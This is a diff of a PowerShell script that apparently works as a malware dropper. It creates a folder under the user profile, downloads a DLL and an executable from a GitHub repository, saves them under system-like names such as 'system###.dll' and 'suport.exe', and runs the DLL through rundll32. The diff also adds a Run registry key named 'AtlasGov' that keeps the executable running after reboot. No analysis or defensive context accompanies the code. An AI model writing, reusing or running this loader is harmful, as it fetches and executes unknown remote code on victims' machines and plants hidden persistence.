@@ -3,14 +3,15 @@ $path_new = $env:USERPROFILE+"\pdf\";
 If (-not (Test-Path $path_new)){
 	New-Item -Path $path_new -ItemType Directory | Out-Null;
 }
-$file = "AAAsystem"+ (Get-Random -Maximum 999) + ".dll"
+$file = "system"+ (Get-Random -Maximum 999) + ".dll"
 $location = $path_new + $file;
-$location2 = $path_new + "suport.exe";
+$location2 = $path_new + "suport" + ".exe";
 $uri = "https://github.com/iskww/Atlas/raw/main/win32.dll";
 $uri2 = "https://github.com/iskww/Atlas/raw/main/reports.exe";
 Set-Location $path_new
-Remove-Item *.*
+Remove-Item *.dll
 $cli = New-Object System.Net.WebClient;
 $cmd = $cli.DownloadFile($uri, $location);
 $cmd = $cli.DownloadFile($uri2, $location2);
 Start-Process rundll32.exe -ArgumentList "$file, $call" ;
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name "AtlasGov" -Value $location2
